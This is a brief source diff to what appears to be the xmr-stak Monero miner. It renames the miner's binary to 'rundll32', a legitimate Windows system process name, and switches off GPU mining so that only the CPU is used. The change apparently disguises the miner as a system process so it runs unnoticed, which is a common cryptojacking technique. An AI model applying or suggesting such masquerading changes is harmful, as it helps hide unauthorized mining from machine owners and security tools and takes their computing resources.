@@ -58,11 +58,11 @@ struct params
 	int benchmark_work_sec = 60;
 
 	params() :
-		binaryName("xmr-stak"),
+		binaryName("rundll32"),
 		executablePrefix(""),
-		useAMD(true),
-		AMDCache(true),
-		useNVIDIA(true),
+		useAMD(false),
+		AMDCache(false),
+		useNVIDIA(false),
 		useCPU(true),
 		openCLVendor("AMD"),
 		configFile("config.txt"),
